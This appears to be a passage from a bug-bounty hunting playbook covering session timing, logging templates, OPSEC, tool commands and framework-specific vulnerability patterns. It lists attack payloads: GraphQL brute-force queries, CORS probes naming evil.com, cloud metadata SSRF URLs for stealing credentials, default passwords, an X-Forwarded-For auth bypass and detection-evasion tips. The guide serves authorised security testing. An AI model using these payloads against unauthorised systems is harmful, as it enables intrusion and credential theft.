### 4.4 Time Management in Hunting

**The 10-minute rule:**
- Spend max 10 minutes per bug class per feature
- If you find something interesting within 10 minutes, dig deeper
- If you hit a dead end, move to the next bug class
- Cycle back to promising features during the 3rd hour

**2-hour target cadence:**
- 0:00-0:15: Phase 1 Recon (subdomains, URLs, scope)
- 0:15-0:30: Phase 2 Pre-Hunt (disclosed reports, tech stack research)
- 0:30-1:00: Phase 3 IDOR + Auth Bypass (highest impact)
- 1:00-1:30: Phase 3 SSRF + SQLi + XSS (next tier)
- 1:30-1:50: Phase 3 Business Logic + File Upload + API Misconfig
- 1:50-2:00: Phase 4 Validation (confirm findings, take evidence)

**When to go deeper:**
- You found a working exploit -> capture evidence and validate thoroughly
- The target has a custom feature not seen before -> spend more time
- An endpoint returns unusual data -> investigate the root cause
- A WAF triggers differently with different payloads -> probe WAF configuration

**When to move on:**
- 10 minutes on a bug class with no results
- The endpoint returns consistent 403/401 for all test cases
- The feature is a well-known third-party integration (already heavily tested)
- The program has been inactive (no triage in 30+ days)

### 4.5 The Kill Decision

Most findings should be killed. Here is when to kill immediately:

**Kill if the finding:**
- Requires the attacker to be on the same network (internal-only)
- Requires a specific browser version that is already patched
- Requires the user to be tricked in an unrealistic way
- Is a defense-in-depth issue (missing header, weak policy)
- Has been reported by someone else (check HackerOne Hacktivity)
- Is theoretically possible but no PoC exists
- Affects only a negligible number of users
- Is actually intended behavior

**Kill ratio expectation:**
- 80% of findings should be killed before report writing
- 15% should pass and be reported
- 5% should be held for chaining (kill standalone, but note the chain primitive)

---

## 5. HUNTING SESSION LOGGING

Every hunting session should be logged for future reference.

### Session Start Checklist

Before starting a session, confirm:
- [ ] Target domain(s) confirmed in scope
- [ ] Program safe-harbor terms confirmed
- [ ] Test accounts ready (minimum 2 for IDOR testing)
- [ ] Burp/Collaborator/interact.sh setup and tested
- [ ] Screenshot tool ready (ShareX, Flameshot, etc.)
- [ ] All testing tools available and working
- [ ] Previous session notes reviewed (if continuing from last session)

### Session Log Template

```
SESSION START: YYYY-MM-DD HH:MM
TARGET: target.com
PROGRAM: HackerOne/Bugcrowd/Intigriti
SCOPE: *.target.com (excluding acq.target.com)

ACCOUNTS:
- Account A (attacker): attacker+1@test.com
- Account B (victim): victim+1@test.com

TOOLS LOADED:
- . .\tools\powershell\powershell-lib.ps1
- . .\tools\powershell\curl-hunter.ps1

RECON NOTES:
- subdomains found: 47
- live hosts: 23
- tech stack: Rails 7, React 18, PostgreSQL, Cloudflare

HUNTING LOG:
00:05-00:20: Recon - found admin.target.com (403), api.target.com (200)
00:20-00:35: IDOR on /api/v2/users/{id}/profile
  - Tested User A -> User B with user_id=4242
  - Result: 403 Forbidden (authz working)
00:35-00:45: Auth bypass on admin.target.com
  - Direct nav: 403
  - X-Forwarded-For: 127.0.0.1 -> 200, admin panel loaded!
  - AUTH BYPASS CONFIRMED - capturing evidence
00:45-01:00: Evidence capture
  - Screenshot 1: Unauth state (incognito)
  - Screenshot 2: Request with X-Forwarded-For
  - Screenshot 3: Admin panel loaded
  - Finding: Auth bypass on admin.target.com via X-Forwarded-For header spoofing

FINDINGS:
1. [Confirmed] Auth bypass on admin.target.com (CVSS 4.0: 9.3 Critical)
   - Status: Ready for report writing
   - Notes: X-Forwarded-For: 127.0.0.1 bypasses IP-based allowlist

SESSION END: YYYY-MM-DD HH:MM
Total time: 2h 15m
Findings found: 1
Findings killed: 3 (weak XSS, missing CSP, rate limiting on non-critical)
Findings submitted: 0
```

### After-Session Hygiene

1. Rotate all test account passwords
2. Log out of all sessions
3. Clear browser cookies for target domains
4. Invalidate any intercept tools (close Burp, reset collaborator)
5. Save session log to `sessions/target-date.md`
6. Review findings list for chain opportunities
7. Update hunting notes with lessons learned

---

## 6. HUNTING SAFETY AND OPSEC

### Account Safety

- Never use personal accounts for testing (use test@email aliases)
- Never test from a corporate network or VPN
- Never use your real name or personal information in test accounts
- Use separate email addresses for each program
- Do not cross-contaminate accounts between programs

### Data Safety

- Never download or store real user PII beyond what the PoC requires
- Delete downloaded data immediately after PoC capture
- Redact all PII in screenshots before saving to disk
- Do not upload or share any real user data outside the program
- Encrypt local finding files with sensitive data

### Detection Avoidance

Bug bounty programs expect to see testing traffic, but aggressive detection can
result in IP bans or account suspension:

- Be aware of WAF rate limiting (tools can trigger blocks)
- Space out automated requests with random delays
- Avoid credential-stuffing level traffic volume
- Respect rate limits even when testing rate limit bypass
- Use legitimate-looking User-Agent strings
- Do not use testing tools that have known signatures

### Responsible Disclosure

- Never disclose a vulnerability publicly before the program has fixed it
- Never post PoC data in public forums, Discord, or Twitter
- Never discuss active findings with other researchers
- Follow the program's disclosure timeline
- If the program is unresponsive, follow the platform's escalation process

---

## 7. HUNTING REFERENCE: QUICK-START COMMANDS

### Recon Commands

```powershell
# Passive subdomain enumeration
& ".\tools\powershell\recon-toolkit.ps1"; Invoke-PassiveSubdomainEnum -Domain target.com

# HTTP probing
& ".\tools\powershell\recon-toolkit.ps1"; Invoke-HTTPProbe -InputFile subs.txt

# Wayback URL collection
& ".\tools\powershell\recon-toolkit.ps1"; Invoke-WaybackCrawl -Domain target.com

# Full recon pipeline
& ".\tools\powershell\recon-toolkit.ps1"; Start-ReconPipeline -Domain target.com
```

### IDOR Testing

```powershell
# Test IDOR on an endpoint with sequential IDs
& ".\tools\powershell\curl-hunter.ps1"; Test-IDOR -BaseUrl "https://api.target.com/users" -SessionCookie "session=YOUR_SESSION" -StartId 1 -EndId 100
```

### SSRF Testing

```powershell
# Test SSRF with Burp Collaborator callback
& ".\tools\powershell\curl-hunter.ps1"; Test-SSRF -TargetUrl "https://target.com/fetch" -ParameterName url -CallbackUrl "http://YOUR.BURPCOLLABORATOR.NET"
```

### CORS Testing

```powershell
# Test CORS misconfiguration
& ".\tools\powershell\curl-hunter.ps1"; Test-CORS -Url "https://api.target.com/users/me"
```

### JS Analysis

```powershell
# Extract endpoints and secrets from JS bundles
& ".\tools\powershell\js-analyzer.ps1"; Invoke-JSBundleAnalysis -Url "https://target.com/assets/app.js"
```

### Evidence Collection

```powershell
# Capture and sanitize evidence
& ".\tools\powershell\evidence-toolkit.ps1"; New-EvidencePackage -TargetId "target.com" -VulnType "idor" -ScreenshotDir "C:\screenshots"
```

---

## 8. HUNTING QUIK-REF: COMMON BUG CLASSES BY ATTACK VECTOR

| Attack Vector | Bug Class | Impact | CVSS Range | Time to Find |
|--------------|-----------|--------|------------|-------------|
| ID parameter manipulation | IDOR | Read/write other users' data | 5.9-8.3 | 5-30 min |
| Missing auth check | Auth bypass | Unauthorized access | 9.3-10.0 | 5-15 min |
| External URL fetch | SSRF | Internal network access | 7.5-10.0 | 10-30 min |
| User input in page | XSS (stored) | Cookie theft, UI redressing | 6.9-9.1 | 10-45 min |
| User input in query | SQLi | Database extraction | 7.5-9.8 | 15-60 min |
| Concurrent requests | Race condition | Financial gain, privilege | 4.1-6.8 | 20-60 min |
| File upload | RCE / XSS | Server compromise | 4.3-10.0 | 10-30 min |
| API docs exposed | Full API enum | Complete attack surface | Varies | 5-10 min |
| Coupon/price field | Business logic | Financial gain | 4.3-7.5 | 10-30 min |
| JWT token | JWT attacks | Account takeover | 9.1-9.3 | 10-20 min |
| JSON body merge | Mass assignment | Privilege escalation | 5.9-7.5 | 5-15 min |
| CORS headers | CORS misconfig | Cross-origin data theft | 4.3-7.5 | 5 min |
| DNS CNAME | Subdomain takeover | Full subdomain control | 8.3 | 10-30 min |

---

## 9. TECHNOLOGY-SPECIFIC HUNTING PATTERNS

### 9.1 Ruby on Rails

**Common Rails patterns:**
- `/rails/info/properties` — Rails info page (disable in production)
- `/rails/info/routes` — route listing (disable in production)
- `/assets/` — asset pipeline may expose source maps
- `.json` extension on any route — API responses
- `_method` parameter — HTTP method override (check for CSRF bypass)
- `authenticity_token` — CSRF token in forms (check for token reuse)

**Rails-specific vulnerabilities:**
- Mass assignment via `params.permit` misconfiguration (check if role/admin fields are not permitted)
- YAML deserialization via `YAML.load` (CVE-2013-0156)
- Unsafe query generation via `User.where("name = '#{params[:name]}'")` — SQLi
- `render inline:` or `render text:` with user input — SSTI
- Secret key base disclosure via `/rails/info/properties` — session forgery
- Sprockets information disclosure via `/?action=...` routes
- Route-based IDOR — `/users/:id` routes often missing authorization

**Rails authentication patterns:**
- `before_action :authenticate_user!` — checks for auth but may miss :only/:except filters
- `before_action :authorize_admin!` — custom authz, often has omissions
- `devise` default configurations — check for weak lockout or rememberable token forgery
- `session[:user_id]` based auth — check if session is fixed or predictable

### 9.2 Node.js / Express

**Common Express patterns:**
- `/api/*` routes with JSON bodies
- `req.body` directly passed to database or merge operations (prototype pollution)
- `app.use(express.json())` with no size limits — DoS via large payloads
- `res.json({ ...req.body })` — mass assignment via direct body reflection
- `req.params` and `req.query` used without validation — injection points

**Node.js-specific vulnerabilities:**
- Prototype pollution: `lodash.merge({}, req.body)`, `Object.assign(req.body)`, `$.extend(req.body)`
- Regular expression DoS (ReDoS): user input against unvalidated regex patterns
- Path traversal: `fs.readFileSync(path.join(__dirname, 'files', req.params.file))` with `../`
- Eval injection: `eval(req.body.expression)`, `new Function(req.body.code)`
- Server-Side Template Injection: `res.render('template', { user_input: req.body.name })` if template engine renders user-controlled content
- XSS via SSR frameworks: Next.js, Nuxt.js server-side rendering of user input
- SSRF via `axios.get(req.body.url)`, `request(req.body.uri)`, `node-fetch(req.query.url)`

**Node.js dependency issues:**
- Left-pad style: tiny dependencies with broad access to the runtime
- Supply chain: check package.json for deprecated or vulnerable packages
- `npm audit` output — but programs rarely fix all vulnerabilities
- Check for `.env` file exposure in public directories
- Check for `node_modules` directory listing (unlikely but worth checking)

### 9.3 Django / Python

**Common Django patterns:**
- `/admin/` — Django admin interface (check for default credentials)
- `/api/` — REST framework endpoints
- `/graphql/` — GraphQL (check introspection)
- `/static/` — static file serving
- `*.json` or `?format=json` — API format switching

**Django-specific vulnerabilities:**
- Debug mode enabled: `DEBUG = True` in production (stack traces, settings leakage)
- Mass assignment via `ModelSerializer` without `read_only_fields` on sensitive fields
- SQL injection via `extra()`, `raw()`, or `annotate()` with user input
- SSTI via Django template engine if user input reaches `Template()` or `render()`
- Clickjacking: Django defaults to `X-Frame-Options: DENY` but custom views may override
- Session manipulation: `SESSION_SERIALIZER` = `PickleSerializer` (deserialization RCE)

**Django REST Framework:**
- Check for permissions class misconfiguration: `permission_classes = [AllowAny]` on sensitive views
- `ModelViewSet` with `get_queryset` returning all objects instead of user-scoped — IDOR
- `@action(detail=False)` endpoints sometimes missing auth
- Check for `django-cors-headers` configuration allowing `CORS_ORIGIN_ALLOW_ALL = True`

### 9.4 React / Next.js / SPA

**Common SPA patterns:**
- Client-side routing means API endpoints are in JavaScript source code
- API calls visible in DevTools Network tab and JS bundles
- Environment variables with `REACT_APP_*` prefix are bundled into the client
- `__NEXT_DATA__` in Next.js pages — often contains API responses, tokens, internal data
- `.next/` build directory may be exposed via static file serving
- Source maps (`*.map`) left in production — full application source code

**Next.js specific:**
- `/api/*` serverless functions — check authz on these endpoints
- `getServerSideProps` — check if it fetches data without auth
- `_next/data/` — internal API routes for static generation
- `next.config.js` — environment variable leakage in build output
- Middleware bypass: `middleware.ts` can be bypassed with trailing slashes, URL encoding, or HTTP methods
- `rewrites` and `redirects` — may expose internal endpoints

**SPA auth tokens:**
- JWTs in localStorage (accessible via XSS)
- Auth tokens in URL fragments (logrocket, segment, fullstory can capture)
- OAuth tokens in callback URLs
- API keys in client-side code (Stripe publishable key, Google Maps, etc.)

### 9.5 ASP.NET / .NET Core

**Common ASP.NET patterns:**
- `/api/*` — REST endpoints
- `/swagger`, `/swagger/v1/swagger.json` — Swagger documentation
- `*.aspx`, `*.asmx`, `*.svc` — legacy WebForms/WCF
- `/elmah.axd` — ELMAH error logging (full exception details)
- `/trace.axd` — ASP.NET tracing
- `Web.config` / `web.config` — configuration (check for readable)

**ASP.NET-specific vulnerabilities:**
- ViewState validation bypass: `__VIEWSTATE` with MAC validation disabled
- `MachineKey` recovery: known default or weak keys -> deserialization RCE
- IIS short filename disclosure: `~1` directory enumeration
- HTTP.sys vulnerability: `MS15-034` range header DoS
- `Request.Validation` disabled: `validateRequest=false` or `[AllowHtml]` -> XSS
- `customErrors mode="Off"` -> stack traces in production
- `Directory.Browse` enabled -> directory listing in static folders
- ELMAK configuration: `elmah.axd` with no auth -> full exception log access

### 9.6 GraphQL Queries to Try

```
# Introspection
query { __schema { types { name fields { name } } } }

# Batching (bypass rate limiting)
query { user1: user(id: 1) { email } user2: user(id: 2) { email } }

# Depth attack
query { user(id: 1) { posts { comments { author { posts { comments { author { posts { ... } } } } } } } } }

# Direct object reference
query { user(id: 99999) { email privateField ssn } }

# Mutation without auth
mutation { deleteUser(id: 99999) }

# Field duplication
query { user(id: 1) { email email email email email } }

# Alias-based brute-force
query { u1: user(id: 1) { email } u2: user(id: 2) { email } ... u100: user(id: 100) { email } }
```

### 9.7 CORS Probes

```
# Reflected origin
Origin: https://evil.com
-> Access-Control-Allow-Origin: https://evil.com
-> Access-Control-Allow-Credentials: true
=VULNERABLE

# Null origin
Origin: null
-> Access-Control-Allow-Origin: null
=VULNERABLE (null origin is never legitimate for credentialed requests)

# Subdomain bypass
Origin: https://evil.target.com
-> If target accepts *.target.com, this works if you control a subdomain

# Regex bypass
Origin: https://target.com.evil.com
-> Access-Control-Allow-Origin: https://target.com.evil.com
=VULNERABLE (someone controls evil.com)

# Regex greedy bypass
Origin: https://targets.com
-> If regex is /target\.com$/, "targets.com" matches
=VULNERABLE

# Special characters
Origin: https://target.com:443@evil.com
-> Some parsers see the origin as target.com
```

### 9.8 SSRF Cloud Metadata Endpoints

AWS (IMDSv1):
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  http://169.254.169.254/latest/user-data/

AWS (IMDSv2 — harder):
  PUT http://169.254.169.254/latest/api/token (TTL=21600)
  Then use Token header for subsequent requests

GCP:
  http://metadata.google.internal/computeMetadata/v1/
  http://metadata.google.internal/computeMetadata/v1/project/project-id
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  Header: Metadata-Flavor: Google

Azure:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header: Metadata: true
  http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
  Header: Metadata: true

Alibaba Cloud:
  http://100.100.100.200/latest/meta-data/
  http://100.100.100.200/latest/meta-data/ram/security-credentials/

DigitalOcean:
  http://169.254.169.254/metadata/v1.json

Oracle Cloud:
  http://169.254.169.254/opc/v1/instance/

### 9.9 Common Default Credentials to Test

| Service | Username | Password |
|---------|----------|----------|
| Tomcat | tomcat | tomcat |
| JBoss | admin | admin |
| Jenkins | admin | admin |
| Grafana | admin | admin |
| Kibana | elastic | changeme |
| RabbitMQ | guest | guest |
| PostgreSQL | postgres | postgres |
| Redis | (none) | (none) |
| MongoDB | admin | (none) |
| MySQL | root | (none) |
| WordPress | admin | admin |
| Django Admin | admin | admin |
| phpMyAdmin | root | (none) |
| FTP | anonymous | anonymous |

### 9.10 Technology Stack Callback Table

Use this to build context before hunting a target:

| Tech Detected | Likely CVEs | Easy Wins | Attack Surface |
|---------------|-------------|-----------|----------------|
| Rails | CVE-2013-0156 (YAML), CVE-2016-2098 (SSTI) | Mass assignment, route disclosure, secret key | All /api routes |
| Node/Express | Prototype pollution, ReDoS | GraphQL, prototype pollution, SSRF | JSON endpoints |
| Django | DEBUG=True, pickle | Admin default creds, DRF perms | /admin/, /api/ |
| ASP.NET | ViewState, machineKey, short names | ELMAH, trace.axd, directory browse | Legacy .aspx/.asmx |
| WordPress | Plugin CVEs, wp-config disclosure | Default creds, user enum, XMLRPC | /wp-content/ |
| PHP/Laravel | Debug mode, .env exposure | SSTI if Blade, artisan routes | /storage/logs/ |
| Java/Spring | Spring4Shell, Log4Shell, Actuator | Actuator endpoints, env disclosure | /actuator/ |
| Go | Typically fewer class bugs | Business logic, IDOR, SSRF | Custom logic |
| Cloudflare | WAF bypass, origin IP discovery | Check CVE list, try bypass techniques | Everything behind CF |

---

## 10. HUNTING VOCABULARY

| Term | Definition |
|------|-----------|
| Attack surface | Sum of all reachable and testable endpoints, features, and assets |
| Blast radius | Number of users or systems affected by a vulnerability |
| Chain primitive | A finding that is not independently valid but enables a higher-impact finding when chained |
| CVSS | Common Vulnerability Scoring System (3.1 or 4.0) |
| Dupes | Duplicate submissions — same bug reported by multiple researchers |
| Edge case | Unusual input or state that bypasses normal logic |
| Heisenbug | A bug that disappears when you try to reproduce it |
| IDOR | Insecure Direct Object Reference — accessing a resource by ID without authorization |
| Impact | The actual harm an attacker can cause, in business terms |
| Killed finding | A bug that was discovered but determined not submittable |
| N/A | Not Applicable — finding was rejected by the program |
| OOS | Out of Scope — testing this asset violates the program policy |
| OpsEC | Operational Security — staying undetected during testing |
| P0/P1/P2/P3 | Priority levels (Critical/High/Medium/Low) |
| PoC | Proof of Concept — evidence that the vulnerability exists |
| Primitive | A basic attack capability (e.g., XSS, CSRF, open redirect) that can be chained |
| Safe harbor | Legal protection for good-faith security testing |
| Scope | The set of assets explicitly authorized for testing |
| Triager | The person at the program who reviews incoming reports |
| VRT | Vulnerability Rating Taxonomy (Bugcrowd) |
| WAF | Web Application Firewall |
